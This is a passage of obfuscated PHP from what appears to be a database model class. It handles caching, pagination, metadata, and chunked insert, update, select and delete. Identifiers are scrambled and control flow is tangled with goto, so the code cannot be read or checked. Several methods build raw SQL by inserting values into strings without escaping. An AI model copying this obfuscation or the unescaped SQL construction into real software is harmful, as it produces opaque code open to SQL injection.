$e¦ÖëÏ‘±³, $Eõ¦³ˆå¬Ş); } public static function textEncode($a™†Õ´¬âİ) { if (!$a™†Õ´¬âİ) { return $a™†Õ´¬âİ; } $bŠßùï±‹™ = json_encode($a™†Õ´¬âİ); $bŠßùï±‹™ = preg_replace_callback($_SERVER[ÚŠ•´ÍéÒÑÔ][339], function ($Cä½ö¼†¨) { return addslashes($Cä½ö¼†¨[0]); }, $bŠßùï±‹™); return json_decode($bŠßùï±‹™); } public static function textDecode($fƒË³¸¿Ë¦) { $aŠñİ‘íšä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F½Îà› = json_encode($fƒË³¸¿Ë¦); $F½Îà› = preg_replace_callback($aŠñİ‘íšä[340], function ($bÂãó¢˜¹) { return $_SERVER[ÚŠ•´ÍéÒÑÔ][95]; }, $F½Îà›); return json_decode($F½Îà›); } protected $tableMeta = array(); protected function _beforeInsert(&$eïîùèç±Ã, $fÂÓ‹³äÏ) { $bõ¨Éî†Æ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->checkDataAutoHas($bõ¨Éî†Æ[341])) { return; } $this->dataBeforeFilter($eïîùèç±Ã, $bõ¨Éî†Æ[341]); } protected function _beforeUpdate(&$A¸®´±“‰Ñ, $bô¼¹¥ˆ‰½) { $D‰„ºš…åÁ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->checkDataAutoHas($D‰„ºš…åÁ[342])) { return; } $this->dataBeforeFilter($A¸®´±“‰Ñ, $D‰„ºš…åÁ[342]); } protected function _afterSelect(&$CŸéíù¿’Å, $a³ÏÚ‰çÇ) { if (!is_array($CŸéíù¿’Å)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÚŠ•´ÍéÒÑÔ][343])) { return; } foreach ($CŸéíù¿’Å as &$cÖÅ£·À¿) { $this->dataAfterFilter($cÖÅ£·À¿); } } protected function _afterFind(&$cè¼…Ç­¿Ö, $d“½ºëÈÂ“) { if (!is_array($cè¼…Ç­¿Ö)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÚŠ•´ÍéÒÑÔ][343])) { return; } $this->dataAfterFilter($cè¼…Ç­¿Ö); } public function setAutoIncrement($eë†±ñåîŠ) { $BÈó¶´ùò = array($this->getPk() => $eë†±ñåîŠ); $f˜‹´â ¡ = $this->data($BÈó¶´ùò)->add(); if ($f˜‹´â ¡) { $this->delete($f˜‹´â ¡); } } public function getAutoIncrement() { $aë×½ŒØÑˆ = $this->getTableName(); $EÊ™Íİ¹Æá = $this->max($this->getPk()); $A­¶ƒŠˆ = $this->query("\163\x68\x6f\x77\x20\x74\141\142\154\145\40\x73\x74\141\164\x75\x73\x20\167\x68\145\x72\145\40\x4e\x61\155\x65\x3d\x27{$aë×½ŒØÑˆ}\47"); $CÓ£ÏÑ”…” = $A­¶ƒŠˆ[0][$_SERVER[ÚŠ•´ÍéÒÑÔ][344]]; $EìÔ—ĞÙİ® = max($EÊ™Íİ¹Æá, $CÓ£ÏÑ”…”); return $EìÔ—ĞÙİ®; } protected function _callBefore($A‡ÖÏÅ·óˆ, $E‘Ø‘„ğ ¶) { return $this->cacheCallCheck($A‡ÖÏÅ·óˆ, $E‘Ø‘„ğ ¶, !1); } protected function _callAfter($d¼‹İæ·éî, $B¬³¬¼µ») { return $this->cacheCallCheck($d¼‹İæ·éî, $B¬³¬¼µ», !0); } protected function cacheFunctionAlias($AÓ¼Ğ»ÂöÛ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($aôˆå¼©ğ, $e‚‡ĞÓÃÊğ, $C·Œ•Ä®å = false) { $e÷öš¥ä¶ä = $this->cacheFunctionAlias($e‚‡ĞÓÃÊğ); if (!$e÷öš¥ä¶ä) { return; } foreach ($e÷öš¥ä¶ä as $c¾¦Ùª™¨ => $a™À¥æ«Ñ¢) { $f­¡î¸¥ † = $a™À¥æ«Ñ¢[0]; $bì÷Ô¤±ñõ = explode($_SERVER[ÚŠ•´ÍéÒÑÔ][47], $a™À¥æ«Ñ¢[1]); if ($aôˆå¼©ğ == $c¾¦Ùª™¨) { return $this->cacheFunctionGet($c¾¦Ùª™¨, $f­¡î¸¥ †); } if ($C·Œ•Ä®å && in_array($aôˆå¼©ğ, $bì÷Ô¤±ñõ)) { $this->cacheFunctionClear($c¾¦Ùª™¨, $f­¡î¸¥ †); } } } public function cacheFunctionGet($aï‹å±«Ø, $AÇ·Îğéò) { $DŞÊÌÕôÀ‰ = $this->cacheKeyMake($aï‹å±«Ø, $AÇ·Îğéò); $A‡İá“ŠÓ = Cache::get($DŞÊÌÕôÀ‰); if (!is_array($A‡İá“ŠÓ)) { $A‡İá“ŠÓ = call_user_func_array(array($this, $aï‹å±«Ø), array($AÇ·Îğéò, !0)); Cache::set($DŞÊÌÕôÀ‰, $A‡İá“ŠÓ); } return $A‡İá“ŠÓ; } public function cacheFunctionClear($D“Áø®Ì’•, $e˜Ë»ø¯) { $B÷×ÀÙÉğ = $e˜Ë»ø¯; if (!is_array($e˜Ë»ø¯)) { $B÷×ÀÙÉğ = array($e˜Ë»ø¯); } foreach ($B÷×ÀÙÉğ as $B…áÅ›êå) { $eëÏ¢­ã• = $this->cacheKeyMake($D“Áø®Ì’•, $B…áÅ›êå); Cache::remove($eëÏ¢­ã•); } } private function cacheKeyMake($eïÇ¡ñíµÒ, $a˜«–ö§‹–) { $F¯Ğ„¤Ôê =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; return get_class($this) . $F¯Ğ„¤Ôê[70] . $eïÇ¡ñíµÒ . $F¯Ğ„¤Ôê[345] . $a˜«–ö§‹–; } protected function selectPage($F£ÀØâÕƒæ = 200, $eØôµŸŠÎ = 1) { goto bˆ–ëØ„œ; Fö‚—â”‚ñ: $b»êí‰ÎùÌ = intval($this->count()); $F£ÀØâÕƒæ = intval($F£ÀØâÕƒæ); $F£ÀØâÕƒæ = $F£ÀØâÕƒæ <= 5 ? 5 : ($F£ÀØâÕƒæ >= $dÜ”åÌëğ§ ? $dÜ”åÌëğ§ : $F£ÀØâÕƒæ); goto E¹ÑØæÛÁ; bˆ–ëØ„œ: $BÄ›Ö›¤Àš =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; global $in; $cÊ¤œïÛ = $this->optionsValue(); goto bÀÆ…í…“; bÀÆ…í…“: $dÜ”åÌëğ§ = 4000; $F£ÀØâÕƒæ = isset($in[$BÄ›Ö›¤Àš[346]]) ? $in[$BÄ›Ö›¤Àš[346]] : $F£ÀØâÕƒæ; if ($F£ÀØâÕƒæ === -1) { unset($in[$BÄ›Ö›¤Àš[346]]); $dÜ”åÌëğ§ = 100000000; $F£ÀØâÕƒæ = $dÜ”åÌëğ§; } goto d–¨¬Ïé¬‘; E¹ÑØæÛÁ: $AïÏÜ•ºáé = ceil($b»êí‰ÎùÌ / $F£ÀØâÕƒæ); $eØôµŸŠÎ = intval(isset($in[$BÄ›Ö›¤Àš[337]]) ? $in[$BÄ›Ö›¤Àš[337]] : $eØôµŸŠÎ); $eØôµŸŠÎ = $eØôµŸŠÎ <= 1 ? 1 : ($eØôµŸŠÎ >= $AïÏÜ•ºáé ? $AïÏÜ•ºáé : $eØôµŸŠÎ); goto c¢ç¾¨ñÖ“; c¢ç¾¨ñÖ“: $this->optionsValue($cÊ¤œïÛ); $fôëØ®¦´Ÿ = $this->page($eØôµŸŠÎ, $F£ÀØâÕƒæ)->select(); $fôëØ®¦´Ÿ = is_array($fôëØ®¦´Ÿ) ? $fôëØ®¦´Ÿ : array(); goto c‚Ÿá‰±Ë; c‚Ÿá‰±Ë: if ($AïÏÜ•ºáé == 1) { $b»êí‰ÎùÌ = count($fôëØ®¦´Ÿ); } $FÀ´ËùÏÒ¡ = array($BÄ›Ö›¤Àš[348] => array($BÄ›Ö›¤Àš[349] => $b»êí‰ÎùÌ, $BÄ›Ö›¤Àš[346] => $F£ÀØâÕƒæ, $BÄ›Ö›¤Àš[337] => $eØôµŸŠÎ, $BÄ›Ö›¤Àš[350] => $AïÏÜ•ºáé), $BÄ›Ö›¤Àš[351] => $fôëØ®¦´Ÿ ? $fôëØ®¦´Ÿ : array()); return $FÀ´ËùÏÒ¡; goto Cö²ª’•ñ; d–¨¬Ïé¬‘: $FŠŒñá§Î = $cÊ¤œïÛ; $FŠŒñá§Î[$BÄ›Ö›¤Àš[347]] = array(); $this->optionsValue($FŠŒñá§Î); goto Fö‚—â”‚ñ; Cö²ª’•ñ: } protected function checkLength($fˆ…Ğ‘ø‡Ù, $c‡½ÜÉ©“ = 0, $D¸ç‘”ÔĞÈ = '') { $BÅÎƒ÷İ„Ö =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c‡½ÜÉ©“ = $c‡½ÜÉ©“ ? $c‡½ÜÉ©“ : 65536; if (!$fˆ…Ğ‘ø‡Ù || strlen($fˆ…Ğ‘ø‡Ù) < $c‡½ÜÉ©“) { return; } $D¸ç‘”ÔĞÈ = $D¸ç‘”ÔĞÈ ? $D¸ç‘”ÔĞÈ . $BÅÎƒ÷İ„Ö[67] : $BÅÎƒ÷İ„Ö[33]; show_json($D¸ç‘”ÔĞÈ . LNG($BÅÎƒ÷İ„Ö[352]) . "\50{$c‡½ÜÉ©“}\x29", !1); } protected function metaSet($F¡Èñã«§ï, $Eé‚ù’—Â = null, $b­Î°›Òå¿ = null) { goto FµºÇ…¦ø; fŒ¨«Œß‡Î: $F°áÌ¶¯¬->where(array($d·Â×ÔÆè‘ => $F¡Èñã«§ï))->addAll($DË‘ÓØÔ å, array(), !0); return !0; goto d°®ñŞÉçâ; FµºÇ…¦ø: $f¨„›‡ÌĞà =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->tableMeta) { return !1; } $d·Â×ÔÆè‘ = $this->tableMeta[$f¨„›‡ÌĞà[353]]; goto fÖ¤¬Ã…ñ; A¶ñ·Ä›: if (is_string($Eé‚ù’—Â)) { $F™ó‡¥š£[$Eé‚ù’—Â] = $b­Î°›Òå¿; } $DË‘ÓØÔ å = array(); foreach ($F™ó‡¥š£ as $Cè¿×ÜÅá => $BËš¤¾èô”) { $this->checkLength($BËš¤¾èô”, !1, $DœÙ–»“¿´ . $f¨„›‡ÌĞà[4] . $Cè¿×ÜÅá); $DË‘ÓØÔ å[] = array($d·Â×ÔÆè‘ => $F¡Èñã«§ï, $f¨„›‡ÌĞà[89] => $Cè¿×ÜÅá, $f¨„›‡ÌĞà[356] => $BËš¤¾èô”); } goto fŒ¨«Œß‡Î; D‰ŠÌ’«ö: if (is_null($Eé‚ù’—Â)) { return $F°áÌ¶¯¬->where(array($d·Â×ÔÆè‘ => $F¡Èñã«§ï))->delete(); } if (is_null($b­Î°›Òå¿)) { return $F°áÌ¶¯¬->where($c”¥Ú´¯°„)->delete(); } $F™ó‡¥š£ = is_array($Eé‚ù’—Â) ? $Eé‚ù’—Â : array(); goto A¶ñ·Ä›; fÖ¤¬Ã…ñ: $DœÙ–»“¿´ = $this->tableMeta[$f¨„›‡ÌĞà[354]]; $F°áÌ¶¯¬ = Model($DœÙ–»“¿´); $c”¥Ú´¯°„ = array($d·Â×ÔÆè‘ => $F¡Èñã«§ï, $f¨„›‡ÌĞà[355] => $Eé‚ù’—Â); goto D‰ŠÌ’«ö; d°®ñŞÉçâ: } public function metaGet($c©›¬½¨Ê) { goto c˜äßŒ‚’”; aß„æ•ÒÍ›: $f‡‚Ì¦ºæ = Model($this->tableMeta[$cãâ²¸ªá—[354]]); $C†Ø½ç—ª† = array($b»¤‹ç·ÜØ => $c©›¬½¨Ê); $cš«¬¦ŞÄİ = $f‡‚Ì¦ºæ->field($cãâ²¸ªá—[357])->where($C†Ø½ç—ª†)->select(); goto e„«—¤ÆŸ¼; e„«—¤ÆŸ¼: $cš«¬¦ŞÄİ = array_to_keyvalue($cš«¬¦ŞÄİ, $cãâ²¸ªá—[89], $cãâ²¸ªá—[356]); return $cš«¬¦ŞÄİ; goto dœ‚óÆ¡¶’; c˜äßŒ‚’”: $cãâ²¸ªá— =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$this->tableMeta) { return array(); } $b»¤‹ç·ÜØ = $this->tableMeta[$cãâ²¸ªá—[353]]; goto aß„æ•ÒÍ›; dœ‚óÆ¡¶’: } private function checkDataAutoHas($BõºÇáøƒ¶) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $DÕíàò “) { if (in_array($BõºÇáøƒ¶, explode($_SERVER[ÚŠ•´ÍéÒÑÔ][47], $DÕíàò “[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$d‘ƒ¢Ï¯¦Ñ, $cØ§’é·ˆ) { $D·ŸÆ—’Ø =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($this->dataAuto as $E†¸İ¨¢†) { $Eíì‚İ… = $E†¸İ¨¢†[0]; if (!in_array($cØ§’é·ˆ, explode($D·ŸÆ—’Ø[47], $E†¸İ¨¢†[2]))) { continue; } switch (trim($E†¸İ¨¢†[3])) { case $D·ŸÆ—’Ø[306]: case $D·ŸÆ—’Ø[307]: $F‰¢”—â¨ = $E†¸İ¨¢†[1]; $f±©Ï¥¹Áî = isset($E†¸İ¨¢†[4]) ? (array) $E†¸İ¨¢†[4] : array(); if ($F‰¢”—â¨ == $D·ŸÆ—’Ø[187] && array_key_exists($Eíì‚İ…, $d‘ƒ¢Ï¯¦Ñ)) { if (!$d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…]) { unset($d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…]); } break; } if (isset($d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…])) { array_unshift($f±©Ï¥¹Áî, $d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…]); } if ($D·ŸÆ—’Ø[306] == $E†¸İ¨¢†[3]) { $d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…] = call_user_func_array($F‰¢”—â¨, $f±©Ï¥¹Áî); } else { $d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…] = call_user_func_array(array(&$this, $F‰¢”—â¨), $f±©Ï¥¹Áî); } break; case $D·ŸÆ—’Ø[258]: $d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…] = $d‘ƒ¢Ï¯¦Ñ[$E†¸İ¨¢†[1]]; break; case $D·ŸÆ—’Ø[279]: if (isset($d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…]) && !is_string($d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…])) { $d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…] = json_encode_force($d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…]); } break; case $D·ŸÆ—’Ø[308]: if ($d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…] === $D·ŸÆ—’Ø[33]) { unset($d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…]); } break; case $D·ŸÆ—’Ø[309]: $d‘ƒ¢Ï¯¦Ñ[$Eíì‚İ…] = $E†¸İ¨¢†[1]; default: break; } } if ($cØ§’é·ˆ == $D·ŸÆ—’Ø[341]) { $DæÒŞ“ê»§ = strtolower($this->db->getDbType()); if (strpos($DæÒŞ“ê»§, $D·ŸÆ—’Ø[9]) !== 0) { return; } $aËª’Ô§Å = $this->field(!0)->fields; $Aš×Ö¼ÆÒå = $aËª’Ô§Å[$D·ŸÆ—’Ø[237]]; if (isset($aËª’Ô§Å[$D·ŸÆ—’Ø[236]])) { unset($Aš×Ö¼ÆÒå[$aËª’Ô§Å[$D·ŸÆ—’Ø[236]]]); } foreach ($Aš×Ö¼ÆÒå as $d†Üåƒ•èÇ => $cØ§’é·ˆ) { if (!isset($d‘ƒ¢Ï¯¦Ñ[$d†Üåƒ•èÇ])) { $d‘ƒ¢Ï¯¦Ñ[$d†Üåƒ•èÇ] = $D·ŸÆ—’Ø[33]; } } } } private function dataAfterFilter(&$E“¼„˜Õ) { $a‰Ù›Åƒ“ä =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; foreach ($this->dataAuto as $aŒø¦¦Ù—Ä) { $F´‡Ãº¦˜§ = $aŒø¦¦Ù—Ä[0]; if (!in_array($a‰Ù›Åƒ“ä[343], explode($a‰Ù›Åƒ“ä[47], $aŒø¦¦Ù—Ä[2]))) { continue; } if (!isset($E“¼„˜Õ[$F´‡Ãº¦˜§])) { continue; } switch (trim($aŒø¦¦Ù—Ä[3])) { case $a‰Ù›Åƒ“ä[306]: case $a‰Ù›Åƒ“ä[307]: $B£…ÉòÜÖ´ = isset($aŒø¦¦Ù—Ä[4]) ? (array) $aŒø¦¦Ù—Ä[4] : array(); array_unshift($B£…ÉòÜÖ´, $E“¼„˜Õ[$F´‡Ãº¦˜§]); if ($a‰Ù›Åƒ“ä[306] == $aŒø¦¦Ù—Ä[3]) { $E“¼„˜Õ[$F´‡Ãº¦˜§] = call_user_func_array($aŒø¦¦Ù—Ä[1], $B£…ÉòÜÖ´); } else { $E“¼„˜Õ[$F´‡Ãº¦˜§] = call_user_func_array(array(&$this, $aŒø¦¦Ù—Ä[1]), $B£…ÉòÜÖ´); } break; case $a‰Ù›Åƒ“ä[258]: $E“¼„˜Õ[$F´‡Ãº¦˜§] = $E“¼„˜Õ[$aŒø¦¦Ù—Ä[1]]; break; case $a‰Ù›Åƒ“ä[279]: $d÷ÈÚï„Üê = $E“¼„˜Õ[$F´‡Ãº¦˜§]; $E“¼„˜Õ[$F´‡Ãº¦˜§] = json_decode($d÷ÈÚï„Üê, !0); if (is_null($E“¼„˜Õ[$F´‡Ãº¦˜§])) { $E“¼„˜Õ[$F´‡Ãº¦˜§] = $d÷ÈÚï„Üê; } break; case $a‰Ù›Åƒ“ä[308]: if ($E“¼„˜Õ[$F´‡Ãº¦˜§] === $a‰Ù›Åƒ“ä[33]) { unset($E“¼„˜Õ[$F´‡Ãº¦˜§]); } break; case $a‰Ù›Åƒ“ä[309]: $E“¼„˜Õ[$F´‡Ãº¦˜§] = $aŒø¦¦Ù—Ä[1]; default: break; } } } public function saveAll($A¾´ßáâ±Ô) { goto CÓ•‰Ê›ë³; eÉÛºÄê²: $this->chunkEventSet(); goto dÅÅÎìšÈ; CÓ•‰Ê›ë³: $dó¢øåÔŠˆ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Eº½£Õ—¤ = $this->tablePrefix . $this->tableName; $föİ‚ø‹ß = self::SQL_WHERE_IN_CHUNK; goto d¦ìµáÜ¨’; d¦ìµáÜ¨’: $A¾´ßáâ±Ô = is_array($A¾´ßáâ±Ô) ? $A¾´ßáâ±Ô : array(); $eË…½‰µ³š = $dó¢øåÔŠˆ[358]; $fÏ‰÷ó³¨ = 0; goto f¤Ü„™¯ã; f¤Ü„™¯ã: $C¹²òµŸøÇ = array(); $F·Î÷ì¨ä = count($A¾´ßáâ±Ô); for ($F‰èì¸’Â‰ = 0; $F‰èì¸’Â‰ < $F·Î÷ì¨ä; $F‰èì¸’Â‰++) { $aø¾™²®Ğ = $A¾´ßáâ±Ô[$F‰èì¸’Â‰]; if (!is_array($aø¾™²®Ğ) || count($aø¾™²®Ğ) != 4) { continue; } $e¸¾¡½íÚÔ = "\x55\x50\104\x41\x54\x45\40{$Eº½£Õ—¤}\40\x53\x45\x54\x20{$aø¾™²®Ğ[2]}\40\x3d\x20\103\101\x53\x45\40{$aø¾™²®Ğ[0]}\40\12"; if ($fÏ‰÷ó³¨ == 0) { $eË…½‰µ³š = $e¸¾¡½íÚÔ; } $C¹²òµŸøÇ[] = $dó¢øåÔŠˆ[113] . $aø¾™²®Ğ[1] . $dó¢øåÔŠˆ[113]; $fÏ‰÷ó³¨++; $eË…½‰µ³š .= "\40\127\110\x45\116\40\x27{$aø¾™²®Ğ[1]}\47\x20\x54\x48\x45\116\40\47{$aø¾™²®Ğ[3]}\47\40\xa"; if ($fÏ‰÷ó³¨ == $föİ‚ø‹ß || $F‰èì¸’Â‰ == $F·Î÷ì¨ä - 1) { goto B»µ’ÆßÄÙ; Aä¹—ªÛâ: $fÏ‰÷ó³¨ = 0; $eË…½‰µ³š = $e¸¾¡½íÚÔ; $this->chunkEventCheck(count($C¹²òµŸøÇ)); goto d“–Á®ò¤¢; B»µ’ÆßÄÙ: $b¿Í¯Éø†ê = implode($dó¢øåÔŠˆ[47], $C¹²òµŸøÇ); $eË…½‰µ³š .= "\x20\105\x4e\x44\x20\40\x57\x48\105\122\x45\x20{$aø¾™²®Ğ[0]}\40\111\116\x20\50{$b¿Í¯Éø†ê}\51\40"; $this->execute($eË…½‰µ³š); goto Aä¹—ªÛâ; d“–Á®ò¤¢: $C¹²òµŸøÇ = array(); goto c³³£êˆ‹¯; c³³£êˆ‹¯: } } goto eÉÛºÄê²; dÅÅÎìšÈ: } public function saveAllEach($CÕ·Ø§½Ëœ) { $CÔ“É‡Ûß =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $CŞöìƒ°­ = $this->tablePrefix . $this->tableName; foreach ($CÕ·Ø§½Ëœ as $bÃÆöĞŸ†) { if (!is_array($bÃÆöĞŸ†) || count($bÃÆöĞŸ†) != 4) { continue; } $D½°¸÷õ”¨ = $bÃÆöĞŸ†[0] . $CÔ“É‡Ûß[359] . $bÃÆöĞŸ†[1] . $CÔ“É‡Ûß[113]; $cùáÓ„À³‡ = $bÃÆöĞŸ†[2] . $CÔ“É‡Ûß[359] . $bÃÆöĞŸ†[3] . $CÔ“É‡Ûß[113]; $fÉâ¦ÈøŠ» = "\165\160\144\141\x74\145\x20{$CŞöìƒ°­}\x20\x73\x65\164\x20{$cùáÓ„À³‡}\40\167\x68\x65\x72\145\x20{$D½°¸÷õ”¨}\x3b"; $this->execute($fÉâ¦ÈøŠ»); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($C‚í”§É’ö = false, $A¤ïïÀ™ß = false) { $this->_chunkEvent = $C‚í”§É’ö; $this->_chunkEventParam = $A¤ïïÀ™ß; } private function chunkEventCheck($b‹„¾º½†õ) { if (!$this->_chunkEvent) { return; } $F£áÆéÆÜ¨ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $F£áÆéÆÜ¨[$_SERVER[ÚŠ•´ÍéÒÑÔ][360]] = $b‹„¾º½†õ; Hook::trigger($this->_chunkEvent, $F£áÆéÆÜ¨); } public function addAll($dß´‹Å‰ÜÂ, $c¯¼·“ØéÔ = array(), $A°¹²°«» = false) { goto AÓ½©ºªùÚ; d¹™³Ÿò†ƒ: if (method_exists($this->db, $EìÙ¹Ã¿¦Ã[257])) { for ($D‰âÛ¨àõ = 0; $D‰âÛ¨àõ < count($dß´‹Å‰ÜÂ); $D‰âÛ¨àõ += $B·×’Œˆã±) { $dÛ˜‘ˆ‚Õ = array_slice($dß´‹Å‰ÜÂ, $D‰âÛ¨àõ, $B·×’Œˆã±); if (!is_array($dÛ˜‘ˆ‚Õ) || count($dÛ˜‘ˆ‚Õ) == 0) { break; } $F÷ÜåÔÛ¿ = $this->db->insertAll($dÛ˜‘ˆ‚Õ, $c¯¼·“ØéÔ, $A°¹²°«»); $this->chunkEventCheck(count($dÛ˜‘ˆ‚Õ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($dß´‹Å‰ÜÂ as $FğÌÇãÒ’„ => $eÓõä”¬Â‰) { $F÷ÜåÔÛ¿ = $this->db->insert($eÓõä”¬Â‰, $c¯¼·“ØéÔ, $A°¹²°«»); } $this->commit(); } if (!1 !== $F÷ÜåÔÛ¿) { $fÒ…øÛÎË = $this->getLastInsID(); if ($fÒ…øÛÎË) { return $fÒ…øÛÎË; } } return $F÷ÜåÔÛ¿; goto E¦ôÀñÅÄ¸; AÓ½©ºªùÚ: $EìÙ¹Ã¿¦Ã =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; ignore_timeout(); $B·×’Œˆã± = self::SQL_WHERE_IN_CHUNK; goto FíÓ¥ŒÛğ; FíÓ¥ŒÛğ: if (empty($dß´‹Å‰ÜÂ)) { $this->error = think_lang($EìÙ¹Ã¿¦Ã[256]); return !1; } $c¯¼·“ØéÔ = $this->_parseOptions($c¯¼·“ØéÔ); foreach ($dß´‹Å‰ÜÂ as $FğÌÇãÒ’„ => $eÓõä”¬Â‰) { $dß´‹Å‰ÜÂ[$FğÌÇãÒ’„] = $this->_facade($eÓõä”¬Â‰); $this->_beforeInsert($dß´‹Å‰ÜÂ[$FğÌÇãÒ’„], $c¯¼·“ØéÔ); } goto d¹™³Ÿò†ƒ; E¦ôÀñÅÄ¸: } public function save($F°î±’šç = '', $dŞ¹†§ªÁÀ = array()) { goto aØØ‚Ç§÷í; föˆøÀï®Ü: for ($dğÓ–Ö¦ÅŸ = 0; $dğÓ–Ö¦ÅŸ < $F¢ß¿ß®Ø ; $dğÓ–Ö¦ÅŸ += $FÛ’–¹ÏŒÄ) { $b¾ÏØ‹Õ¨è = array_slice($eíìƒŒÏó, $dğÓ–Ö¦ÅŸ, $FÛ’–¹ÏŒÄ); if (!is_array($b¾ÏØ‹Õ¨è) || count($b¾ÏØ‹Õ¨è) == 0) { break; } $bæÌéóºõ¦[$d˜¼¥—¡³µ[260]][$d×ä›°ÄäÂ][1] = $b¾ÏØ‹Õ¨è; $this->optionsValue($bæÌéóºõ¦); $AóµãÎ„ä¶ += parent::save($F°î±’šç, $dŞ¹†§ªÁÀ); $this->chunkEventCheck(count($b¾ÏØ‹Õ¨è)); } $this->chunkEventSet(); return $AóµãÎ„ä¶; goto dÚÈŠùÂâ; a¥‡á±èá: $d×ä›°ÄäÂ = $this->findWhereField($bæÌéóºõ¦); if (!$d×ä›°ÄäÂ) { return parent::save($F°î±’šç, $dŞ¹†§ªÁÀ); } $AóµãÎ„ä¶ = 0; goto a‡…Ñ¨ˆß; aØØ‚Ç§÷í: $d˜¼¥—¡³µ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÛ’–¹ÏŒÄ = self::SQL_WHERE_IN_CHUNK; $bæÌéóºõ¦ = $this->optionsValue(); goto a¥‡á±èá; a‡…Ñ¨ˆß: $eíìƒŒÏó = $bæÌéóºõ¦[$d˜¼¥—¡³µ[260]][$d×ä›°ÄäÂ][1]; $eíìƒŒÏó = is_array($eíìƒŒÏó) ? $eíìƒŒÏó : array(); $F¢ß¿ß®Ø  = count($eíìƒŒÏó); goto föˆøÀï®Ü; dÚÈŠùÂâ: } public function add($F°ù‘‹Ì³ç = '', $b‡Æ¶ ˆŠ = array(), $CÇéîÂŠ„ñ = false) { if ($this->addTaskStatus && is_array($F°ù‘‹Ì³ç)) { $this->addTaskData[] = $F°ù‘‹Ì³ç; return; } return parent::add($F°ù‘‹Ì³ç, $b‡Æ¶ ˆŠ, $CÇéîÂŠ„ñ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($D£Ô‚´Æˆ‡ = array()) { goto B‰˜·Ç¬ª¼; Fâ‚Ñ»Š†Š: $Dôºòó¥¿ = $this->findWhereField($AÓÓ¯´ÒÂ‹); if (!$Dôºòó¥¿ || isset($AÓÓ¯´ÒÂ‹[$dŞœª³œêŞ[277]]) || isset($AÓÓ¯´ÒÂ‹[$dŞœª³œêŞ[337]])) { return parent::select($D£Ô‚´Æˆ‡); } $dÖï‚ƒø¯ğ = $AÓÓ¯´ÒÂ‹[$dŞœª³œêŞ[260]][$Dôºòó¥¿][1]; goto FáË¢Ş¿×ø; FáË¢Ş¿×ø: $dÖï‚ƒø¯ğ = is_array($dÖï‚ƒø¯ğ) ? $dÖï‚ƒø¯ğ : array(); $D£¥’Ë»ƒù = null; for ($F‚éÜ‹×È = 0; $F‚éÜ‹×È < count($dÖï‚ƒø¯ğ); $F‚éÜ‹×È += $EÏéæ™ù²µ) { $f›İ“½æ = array_slice($dÖï‚ƒø¯ğ, $F‚éÜ‹×È, $EÏéæ™ù²µ); if (!is_array($f›İ“½æ) || count($f›İ“½æ) == 0) { break; } $AÓÓ¯´ÒÂ‹[$dŞœª³œêŞ[260]][$Dôºòó¥¿][1] = $f›İ“½æ; $this->optionsValue($AÓÓ¯´ÒÂ‹); $C–¸è…Í«Ù = parent::select($D£Ô‚´Æˆ‡); if (!$C–¸è…Í«Ù) { continue; } if (is_null($D£¥’Ë»ƒù)) { $D£¥’Ë»ƒù = array(); } $D£¥’Ë»ƒù = array_merge($D£¥’Ë»ƒù, $C–¸è…Í«Ù); } goto eÒ“óë‰®; B‰˜·Ç¬ª¼: $dŞœª³œêŞ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÏéæ™ù²µ = self::SQL_WHERE_IN_CHUNK; $AÓÓ¯´ÒÂ‹ = $this->optionsValue(); goto Fâ‚Ñ»Š†Š; eÒ“óë‰®: return $D£¥’Ë»ƒù; goto dã½¦ñŞ­; dã½¦ñŞ­: } public function delete($B£·Ï³Ğ„ã = array()) { goto a¬Ë°ß„•õ; CÊœ®ÍŞù‡: $bª›œ°îŒ† = $this->findWhereField($C‘Éø¼ºµ÷); if (!$bª›œ°îŒ†) { return parent::delete($B£·Ï³Ğ„ã); } $aŠ‹÷¿­ªŒ = 0; goto eÀÊÇÕ–—; a¬Ë°ß„•õ: $aÅô”Èâéç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $eÜ÷êØÅõ = self::SQL_WHERE_IN_CHUNK; $C‘Éø¼ºµ÷ = $this->optionsValue(); goto CÊœ®ÍŞù‡; eÀÊÇÕ–—: $CÑ¬ºİ©·Å = $C‘Éø¼ºµ÷[$aÅô”Èâéç[260]][$bª›œ°îŒ†][1]; $CÑ¬ºİ©·Å 